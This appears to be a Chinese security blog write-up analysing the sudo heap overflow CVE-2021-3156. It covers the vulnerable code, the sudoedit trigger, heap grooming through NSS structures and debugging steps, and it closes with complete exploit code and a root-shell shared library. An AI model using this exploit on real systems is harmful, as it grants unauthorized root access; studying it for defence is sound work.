---
layout:     post   				    # 使用的布局（不需要改）
title:      CVE-2021-3156 sudo 堆溢出利用分析 		 # 标题 
subtitle:   CVE-2021-3156 sudo 堆溢出利用分析               # 副标题
date:       2021-02-03 				# 时间
author:     Mr.R 					# 作者
# header-img: img/post-bg-2015.jpg 	# 这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								# 标签
    - CTF
    - Pwn
---

# CVE-2021-3156 sudo 堆溢出利用分析


[TOC]

今天过生日，送自己个分析报告当礼物，大哥们康到哪不对求轻喷

## 环境

ubuntu 18.04

sudo 1.8.21p2

## 源码分析

### 代码下载

首先要下载源码，这里配置了apt的source源之后直接使用

`apt source sudo`

就可以拉下来一份源码

这里需要注意的是，现在拉下来的源码都是打过patch的，想要没打过patch的源码需要自己手动解压一下

`sudo_1.8.21p2.orig.tar.gz`

### 漏洞点分析

漏洞点产生在./plugins/sudoers/sudoers.c:847处

```c
for (size = 0, av = NewArgv + 1; *av; av++)
  size += strlen(*av) + 1;
if (size == 0 || (user_args = malloc(size)) == NULL) {
  sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
  debug_return_int(-1);
}
if (ISSET(sudo_mode, MODE_SHELL | MODE_LOGIN_SHELL)) {
  for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
    while (*from) {
      if (from[0] == '\\' && !isspace((unsigned char)from[1]))
        from++;
      *to++ = *from++;
    }
    *to++ = ' ';
  }
  *--to = '\0';
} 
```

这里的NewArgv里存放的就是sudo的参数，

首先遍历参数，确定size进行malloc

但是注意下方

```c
      if (from[0] == '\\' && !isspace((unsigned char)from[1]))
        from++;
      *to++ = *from++;
```

如果from == '\\'，并且下一个byte不是空格的话，就会from++，指向下一个字符

```c
814:if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK))
853:if (ISSET(sudo_mode, MODE_SHELL | MODE_LOGIN_SHELL))
```

其中触发条件是**MODE_SHELL**或者**MODE_LOGIN_SHELL**,并且此时设置了**MODE_RUN**,**MODE_EDIT** ,**MODE_CHECK**的其中一个



如果可以使构造出参数最后是一个\\的话，就可以使其指向下一个字符，也就是\x00，将其存下来之后又*from++跳了过去，现在from指向了下一个参数，就可以导致溢出出现，这也就是最初的POC中的后半部分

```
'\' `perl -e 'print "A" x 65536'` 
```

使用\\跳过\x00，然后进行溢出



但是只有这个点还不够，这里没有判断是因为正常情况下到这一步时是经过转义的参数，也就是\后面应该还有其他字符，来看一下转义部分的代码

sudo-1.8.21p2/src/parse_args.c:527

```c
if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
  char **av, *cmnd = NULL;
  int ac = 1;

  if (argc != 0) {
    /* shell -c "command" */
    char *src, *dst;
    size_t cmnd_size =
      (size_t)(argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1;

    cmnd = dst = reallocarray(NULL, cmnd_size, 2);
    if (cmnd == NULL)
      sudo_fatalx(U_("%s: %s"), __func__,
                  U_("unable to allocate memory"));
    if (!gc_add(GC_PTR, cmnd))
      exit(1);

    for (av = argv; *av != NULL; av++) {
      for (src = *av; *src != '\0'; src++) {
        /* quote potential meta characters */
        if (!isalnum((unsigned char)*src) && *src != '_' &&
            *src != '-' && *src != '$')
          *dst++ = '\\';
        *dst++ = *src;
      }
      *dst++ = ' ';
    }
    if (cmnd != dst)
      dst--; /* replace last space with a NUL */
    *dst = '\0';

    ac += 2; /* -c cmnd */
  }
```

```c
if (!isalnum((unsigned char)*src) && *src != '_' &&
    *src != '-' && *src != '$')
  *dst++ = '\\';
```

如果不是数字字母，并且不是_,-,$ 就会在前面加上\\进行转义，其中触发条件是**MODE_RUN**并且是**MODE_SHELL**

那么现在想要绕过转义并进入漏洞点需要的flags就如下

1.设置MODE_SHELL

2.不设置MODE_RUN

3.设置MODE_EDIT或者MODE_CHECK



```c
		case 'e':
		    if (mode && mode != MODE_EDIT)
			usage_excl(1);
		    mode = MODE_EDIT;
		    sudo_settings[ARG_SUDOEDIT].value = "true";
		    valid_flags = MODE_NONINTERACTIVE;
		    break;
		case 's':
		    sudo_settings[ARG_USER_SHELL].value = "true";
		    SET(flags, MODE_SHELL);
		    break;
		case 'l':
		    if (mode) {
						if (mode == MODE_LIST)
			    			SET(flags, MODE_LONG_LIST);
						else
			    			usage_excl(1);
		    }
		    mode = MODE_LIST;
		    valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
		    break;

    if (argc > 0 && mode == MODE_LIST)
				mode = MODE_CHECK;
```

设置MODE_EDIT是-e，MODE_SHELL是-s，MODE_CHECK是在MODE_LIST时设置的，也就是-l

但是-e与-l会设置valid_flags,与-s同时使用会导致出错

```c
if ((flags & valid_flags) != flags)
	usage(1);
```

幸运的是,可以注意到sudoedit可以直接设置MODE_EDIT并且不会设置valid_flags

```c
    proglen = strlen(progname);
    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
			progname = "sudoedit";
			mode = MODE_EDIT;
			sudo_settings[ARG_SUDOEDIT].value = "true";
    }
```

这样也就得到了最初的POC

```
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

## 利用分析

直接使用系统自带的sudo进行调试，因为自己编译出的sudo与系统自带的有些不同，所以选择更通用的



首先malloc的size是由-s后参数的长度决定的，因此可以进行任意大小的堆块分配。

只需要在参数最后加一个\\,然后控制环境变量即可溢出了。

而且这个溢出是可以写入\x00的，只需要在环境变量中写入多个\\就可以在溢出中写入多个\x00了

那么现在的问题就在于，如何使环境变量可以只有\\字符，在正常情况下，用env -i指令设置环境变量必须要以X=X的形式进行。

为了可以直接使用单个\\，选择使用execve函数来触发,以execve(proc,argv,envp);这样的方式调用execve来执行sudo就可以随意写入环境变量而不是必须以X=X的形式了。

如下

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

#define MAX_ENVP 512

int main(){
    char paddingA[0x80];
    memset(paddingA,'A',0x6e);
    paddingA[0x6e]='\\';
    char *s_argv[]={
        "sudoedit", "-s", paddingA,"\\",NULL
    };
    char *envp[MAX_ENVP];
    int envp_pos = 0;
    for(int i = 0;i < 0x40;i++){
        envp[envp_pos++] = "\\";
    }
    envp[envp_pos++] = 0;

    execve("/usr/bin/sudoedit",s_argv,envp);
    return 0;
}
```



此处选择的是利用nss_load_libary进行getshell

我们先来了解一下nss_load_libary用到的结构体与相关调用

```c
typedef struct service_user
{
  /* And the link to the next entry.  */
  struct service_user *next;
  /* Action according to result.  */
  lookup_actions actions[5];
  /* Link to the underlying library object.  */
  service_library *library;
  /* Collection of known functions.  */
  void *known;
  /* Name of the service (`files', `dns', `nis', ...).  */
  char name[0];
} service_user;
```

```c
static int
nss_load_library (service_user *ni)
{
  if (ni->library == NULL)
    {
      /* This service has not yet been used.  Fetch the service
	 library for it, creating a new one if need be.  If there
	 is no service table from the file, this static variable
	 holds the head of the service_library list made from the
	 default configuration.  */
      static name_database default_table;
      ni->library = nss_new_service (service_table ?: &default_table,
				     ni->name);
      if (ni->library == NULL)
	return -1;
    }

  if (ni->library->lib_handle == NULL)
    {
      /* Load the shared library.  */
      size_t shlen = (7 + strlen (ni->name) + 3
		      + strlen (__nss_shlib_revision) + 1);
      int saved_errno = errno;
      char shlib_name[shlen];

      /* Construct shared object name.  */
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
					      "libnss_"),
				    ni->name),
			  ".so"),
		__nss_shlib_revision);

      ni->library->lib_handle = __libc_dlopen (shlib_name);
```

如果可以控制ni->libary = NULL,ni->name为X/X，那么就可以执行dlopen(libnss_X/X.so.2)

控制libnss_X/X.so.2的init为一个getshell的指令即可获得一个root权限的shell。



此处的ni是由另一个函数__nss_database_lookup决定的

注意，在我们set_cmnd后执行的此函数，参数的database="group"

```c
typedef struct name_database_entry
{
  /* And the link to the next entry.  */
  struct name_database_entry *next;
  /* List of service to be used.  */
  service_user *service;
  /* Name of the database.  */
  char name[0];
} name_database_entry;
```



```c

        for (entry = service_table->entry; entry != NULL; entry = entry->next)
            if (strcmp(database, entry->name) == 0)
                *ni = entry->service;

        if (*ni == NULL && alternate_name != NULL)
            for (entry = service_table->entry; entry != NULL; entry = entry->next)
                if (strcmp(alternate_name, entry->name) == 0)
                    *ni = entry->service;

    if (*ni == NULL)
    {
        *ni = nss_parse_service_list(defconfig ?: DEFAULT_DEFCONFIG);
        if (*ni != NULL)
        {
            name_database_entry *entry;

            entry = (name_database_entry *)malloc(sizeof(*entry) + 1);
            if (entry != NULL)
            {
                entry->next = defconfig_entries;
                entry->service = *ni;
                entry->name[0] = '\0';
                defconfig_entries = entry;
            }
        }
    }
```

首先从service_table这个链表中去查询与database相符的服务，然后将其对应的service_user给到ni

而这个链表上的这些结构体是在堆上的，甚至他在0x80的堆块下方，但是此时还有一个问题，service_user结构体是在name_database_entry下方的，如果想修改service_user的话，会破坏掉上方的结构体，导致出现问题。



回头看这几个结构体是如何产生的

```c
    if (service_table == NULL)
        /* Read config file.  */
        service_table = nss_parse_file(_PATH_NSSWITCH_CONF);
```

在第一次进行查找的时候，这里还没有初始化，会进入到nss_parse_file，读取/etc/nsswitch.conf的内容，进行初始化

```c
result = (name_database *)malloc(sizeof(name_database));
this = nss_getline(line);
if (this != NULL)
{
  if (last != NULL)
    last->next = this;
  else
    result->entry = this;

  last = this;
}
```

跟进后得知service_table是malloc(0x10)的到的，其中的链表是读取/etc/nsswitch.conf的每一行，并执行nss_getline来进行的初始化

```
pwndbg> cat /etc/nsswitch.conf
# /etc/nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the `glibc-doc-reference' and `info' packages installed, try:
# `info libc "Name Service Switch"' for information about this file.

passwd:         compat systemd
group:          compat systemd
shadow:         compat
gshadow:        files

hosts:          files dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis
pwndbg>
```

前面的passwd,group之类就是name，后面的则是service_name

```c
    len = strlen(name) + 1;

    result = (name_database_entry *)malloc(sizeof(name_database_entry) + len);
    if (result == NULL)
        return NULL;

    /* Save the database name.  */
    memcpy(result->name, name, len);

    /* Parse the list of services.  */
    result->service = nss_parse_service_list(line);
```

首先获取name的长度，然后再加上0x10，进行malloc，再进入nss_parse_service_list初始化对应的service

```c
while (1){
  new_service = (service_user *)malloc(sizeof(service_user) + (line - name + 1));
  *nextp = new_service;
  nextp = &new_service->next;
}
```

service这里又产生了一个链表，每个的大小为0x30+name

也就是在初始化service_table时依次进行了以下操作

```c
malloc(0x10);
for name in len(names):
	malloc(0x10+len(name));
	for s_name in services:
		malloc(0x30+len(s_name))
```

以测试环境来说，就是依次获取了以下大小的chunk

0x20

0x20,0x40,0x40(passwd)

0x20,0x40,0x40(group)

0x20,0x40(shadow)

...

也就是说，出现service与entry相邻的原因就是他们是连续分割了同一个unsorted bin

如果可以使group的entry与service分开，只让service落到0x80下方，就可以溢出对其进行修改了



那么接下来就要进行调试了，gdb在execve之后会自动跟入，只需要正常下断点就可以断在相应的位置了

主要断点两处，一处是__nss_database_lookup，另一处是sudoers.so中set_cmnd中malloc的位置

由于系统自带的sudo是没有调试符号的，所以需要IDA简单定位一下偏移然后下断点，为了便于debug，先关闭ASLR

```
.text:000000000001D9A2                 jz      loc_1E4D0
.text:000000000001D9A8                 mov     rdi, r14        ; size
.text:000000000001D9AB                 call    _malloc
.text:000000000001D9B0                 test    rax, rax
.text:000000000001D9B3                 mov     r13, rax
.text:000000000001D9B6                 mov     cs:qword_256970, rax
.text:000000000001D9BD                 jz      loc_1E4D0
.text:000000000001D9C3                 test    cs:dword_2568F0, 60000h
.text:000000000001D9CD                 mov     r15, [r15+8]
.text:000000000001D9D1                 jz      loc_1E0E0
.text:000000000001D9D7                 test    r15, r15
.text:000000000001D9DA                 jz      loc_1E288
```

malloc处为0x1d9ab

首先gdb中

```
add-symbol-file sudoers.so 0x7ffff5b68000
b *(0x7ffff5b68000+0x1d9ab)
b __nss_database_lookup
```

在第一次__nss_database_lookup的位置断下，简单调试后可以发现这些初始化操作都是在分割一个比较大的chunk，同时后面0x80的堆块也是在这个chunk上方的



漏洞披露文章中有提到，main函数中的

```c
    setlocale(LC_ALL, "");
    bindtextdomain(PACKAGE_NAME, LOCALEDIR);
    textdomain(PACKAGE_NAME);
```

会读环境变量中LC相关的值进行malloc与free

在多次尝试并结合已公布exp分析后，发现只需要这样设置

```c
    char *LC = calloc(0x3000,1);
    strcpy(LC, "LC_ALL=C.UTF-8@");
    memset(LC+15, 'C', size);
		envp[envp_pos++] = LC;
```

就可以在初始化service_table之前在bins中存放一个size大小的chunk

在给其的大小为0x20+0x40+0x40+0x20时，就可以让对nsswitch.conf中password的初始化以及对group的entry的初始化落到这个空闲的0xc0的chunk中，而后面对group的service的初始化由于已经分割完了0xc0的chunk，会继续分割大chunk，落到0x80大小chunk的下方

至此，利用堆溢出漏洞，就可以成功覆盖到group所对应的serive_user结构体了，也就是可以成功提权

![image-20210203161040714](https://tva1.sinaimg.cn/large/008eGmZEly1gnaevx4xjrj31je0byjsa.jpg)

对于不同环境下的主机，需要查看其/etc/nsswitch.conf文件,来对各种偏移进行修改

exp.c:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

int main(){
    char paddingA[0x80];
    memset(paddingA,'A',0x6e);
    paddingA[0x6e]='\\';
    char *s_argv[]={
        "sudoedit", "-s", paddingA,"\\",NULL
    };
    char *envp[MAX_ENVP];
    int envp_pos = 0;
    for(int i = 0;i < 0x40;i++){
        envp[envp_pos++] = "\\";
    }
    envp[envp_pos++] = "X/X\\";
    for(int i = 0;i < 0xa0;i++){
        envp[envp_pos++] = "\\";
    }
    envp[envp_pos++]="AAAA";
    char *LC = calloc(0x3000,1);
    strcpy(LC, "LC_ALL=C.UTF-8@");
    memset(LC+15, 'A', 0x20+0x40+0x40+0x20);
    envp[envp_pos++] = LC;
    envp[envp_pos++] = 0;

    execve("/usr/bin/sudoedit",s_argv,envp);
    return 0;
}
```

libc.c:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
static void __attribute__ ((constructor)) _init(void);
 
static void _init(void) {
	printf("[+] bl1ng bl1ng! We got it!\n");
	setuid(0); seteuid(0); setgid(0); setegid(0);
	static char *a_argv[] = { "sh", NULL };
	static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
	execv("/bin/sh", a_argv);
}

```

![image-20210203154735075](https://tva1.sinaimg.cn/large/008eGmZEgy1gnae81jt90j31au09u77b.jpg)

参考资料:

[+]https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit

[+]https://github.com/blasty/CVE-2021-3156







